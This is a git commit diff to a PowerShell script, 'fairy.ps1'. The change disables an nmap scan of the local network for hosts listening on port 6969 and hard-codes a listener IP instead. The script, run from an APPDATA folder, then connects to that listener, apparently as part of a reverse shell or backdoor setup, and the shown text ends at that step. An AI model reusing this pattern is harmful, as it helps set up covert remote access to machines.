fcaaf8ff47ba99d247e3865bdd5871f08c9aff3c
h3xagon <62241425+h3xagon0001@users.noreply.github.com>
2025-06-06 21:55:35 +0800

    Update fairy.ps1

--- fairy.ps1
+++ fairy.ps1
@@ -3,16 +3,21 @@ Write-Output "Changing Directory"
 Set-Location -Path "$($env:APPDATA)\Fairy\nmap"
 Write-Output "Directory Changed"
 
-# scan for listening port 6969 on network
+# scan for listening port 6969 on network (disabled until I find a more reliable way)
+<#
 Write-Output "Scanning for port"
 $ScanOutput = .\nmap.exe -p 6969 -T5 -n 192.168.1.0/24 --open
 Write-Output "Scan Finished"
+#>
 
-# get ip of listener
+# get ip of listener (disabled until I find a more reliable way)
+$ListenerIP = "192.168.1.5"
+<#
 Write-Output "Getting IP"
 $string = $ScanOutput | Select-String -Pattern "192\.168\..+"
 $ListenerIP = $string.Matches.Value
 Write-Output "IP Extracted"
+#>
 
 # connect to listener
 Write-Output "Connecting to listener"
